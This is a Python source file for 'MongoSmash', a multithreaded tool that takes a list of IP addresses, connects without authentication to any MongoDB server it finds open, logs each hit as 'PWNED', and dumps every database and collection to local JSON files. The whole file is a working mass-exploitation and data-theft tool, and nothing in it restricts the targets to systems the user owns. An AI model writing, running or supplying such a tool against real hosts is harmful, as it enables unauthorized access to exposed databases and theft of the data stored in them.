import pymongo
from pymongo.errors import ConnectionFailure, OperationFailure
from rich.console import Console
from rich.logging import RichHandler
import logging
import os
from concurrent.futures import ThreadPoolExecutor
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

ascii_art = r"""
 _      ____  _      _____ ____  ____  _      ____  ____  _
/ \__/|/  _ \/ \  /|/  __//  _ \/ ___\/ \__/|/  _ \/ ___\/ \ /|
| |\/||| / \|| |\ ||| |  _| / \||    \| |\/||| / \||    \| |_||
| |  ||| \_/|| | \||| |_//| \_/|\___ || |  ||| |-||\___ || | ||
\_/  \|\____/\_/  \|\____\\____/\____/\_/  \|\_/ \|\____/\_/ \|
"""

console = Console()
logging.basicConfig(level=logging.INFO, format="%(message)s", datefmt="[%X]", handlers=[RichHandler()])
log = logging.getLogger("rich")

PWNED = 25
logging.addLevelName(PWNED, "PWNED")

def pwned(self, message, *args, **kws):
    if self.isEnabledFor(PWNED):
        self._log(PWNED, f"[PWNED] {message}", args, **kws)

logging.Logger.pwned = pwned

def create_directories():
    base_dir = ".mongosmash"
    collections_dir = os.path.join(base_dir, "collections")
    if not os.path.exists(collections_dir):
        os.makedirs(collections_dir)
    return collections_dir

def dump_db_data(client, ip_address, collections_dir):
    ip_dir = os.path.join(collections_dir, ip_address)
    if not os.path.exists(ip_dir):
        os.makedirs(ip_dir)

    for db_name in client.list_database_names():
        db = client[db_name]
        db_path = os.path.join(ip_dir, db_name)
        if not os.path.exists(db_path):
            os.makedirs(db_path)
        for collection_name in db.list_collection_names():
            collection = db[collection_name]
            data = collection.find()
            collection_path = os.path.join(db_path, f"{collection_name}.json")
            with open(collection_path, 'w') as f:
                for document in data:
                    f.write(str(document) + "\n")

def check_mongodb_access(ip_address, collections_dir):
    try:
        client = pymongo.MongoClient(f"mongodb://{ip_address}:27017", serverSelectionTimeoutMS=5000)
        client.admin.command('ismaster')
        log.pwned(f"Successfully connected to MongoDB at {ip_address}")

        dbs = client.list_database_names()
        log.info(f"[PWNED] Databases available on {ip_address}: {', '.join(dbs)}")

        dump_db_data(client, ip_address, collections_dir)
        return True
    except ConnectionFailure:
        log.error(f"Could not connect to MongoDB at {ip_address}")
        return False
    except OperationFailure:
        log.warning(f"MongoDB at {ip_address} requires authentication")
        return False
    except Exception as e:
        log.error(f"An error occurred while connecting to MongoDB at {ip_address}: {e}")
        return False

def main(file_path, num_threads):
    console.print(ascii_art, style="bold green")
    console.print("[bold blue]MongoSmash: Checking MongoDB servers for access without authentication[/bold blue]")
    console.print("[bold blue]Created By kathuluman[/bold blue]")

    collections_dir = create_directories()

    try:
        with open(file_path, 'r') as file:
            ip_list = file.read().splitlines()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(check_mongodb_access, ip, collections_dir) for ip in ip_list]
            for future in futures:
                future.result()
    except FileNotFoundError:
        log.error(f"File not found: {file_path}")
    except Exception as e:
        log.error(f"An error occurred while reading the file: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{Fore.GREEN}MongoSmash: A tool to check MongoDB servers for access without authentication{Style.RESET_ALL}")
    parser.add_argument("-i", "--input", type=str, required=True, help=f"{Fore.YELLOW}Path to the file containing IP addresses{Style.RESET_ALL}")
    parser.add_argument("-t", "--threads", type=int, required=True, help=f"{Fore.YELLOW}Number of threads to use{Style.RESET_ALL}")
    args = parser.parse_args()

    main(args.input, args.threads)
